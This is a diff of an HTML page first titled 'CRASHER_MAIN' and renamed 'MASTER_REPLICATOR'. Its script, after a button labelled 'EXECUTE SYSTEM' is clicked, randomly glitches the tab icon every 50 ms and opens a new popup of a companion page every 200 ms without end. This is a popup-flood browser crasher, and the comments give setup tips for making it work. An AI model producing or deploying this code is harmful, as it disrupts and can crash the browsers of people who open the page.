@@ -1,8 +1,8 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>CRASHER_MAIN</title>
-    <link id="fav" rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><rect width='100' height='100' fill='white'/></svg>">
+    <title>MASTER_REPLICATOR</title>
+    <link id="icon" rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><rect width='100' height='100' fill='white'/></svg>">
     <style>
         body { background: #000; color: #fff; font-family: 'Courier New', monospace; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; text-align: center; }
         .border { border: 2px solid #fff; padding: 50px; box-shadow: 0 0 15px #fff; }
@@ -13,22 +13,22 @@
 <body>
     <div class="border">
         <h1>REPLICATION_CORE</h1>
-        <p>Target: notifacation.html</p>
-        <button onclick="start()">EXECUTE</button>
+        <p>Target: notifacations.html</p>
+        <button onclick="start()">EXECUTE SYSTEM</button>
     </div>
 
     <script>
         function start() {
-            // Tab icon glitch
+            // 1. Favicon Glitch
             setInterval(() => {
                 const p = () => Math.floor(Math.random() * 100);
-                document.getElementById('fav').href = `data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><polygon points='${p()},${p()} ${p()},${p()} ${p()},${p()}' fill='white'/></svg>`;
+                document.getElementById('icon').href = `data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><polygon points='${p()},${p()} ${p()},${p()} ${p()},${p()}' fill='white'/></svg>`;
             }, 50);
 
-            // Opens "notifacation.html" every 200ms
-            // MAKE SURE THE OTHER FILE IS NAMED EXACTLY: notifacation.html
+            // 2. Open the file from your GitHub name
+            // Note: window.open needs the local file to be in the same folder
             setInterval(() => {
-                window.open('notifacation.html', '_blank', 'width=400,height=400');
+                window.open('notifacations.html', '_blank', 'width=400,height=400');
             }, 200);
         }
     </script>
